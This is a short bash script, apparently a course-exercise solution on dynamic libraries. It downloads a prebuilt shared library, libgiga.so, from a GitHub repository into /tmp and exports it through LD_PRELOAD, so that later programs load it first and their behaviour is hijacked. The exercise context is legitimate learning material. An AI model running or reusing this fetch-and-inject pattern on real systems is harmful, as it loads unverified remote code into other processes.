#!/bin/bash
wget -P /tmp https://github.com/khalidboumaghdar/alx-low_level_programming/raw/master/mx18-dynamic_libraries/libgiga.so
export LD_PRELOAD=/tmp/libgiga.so
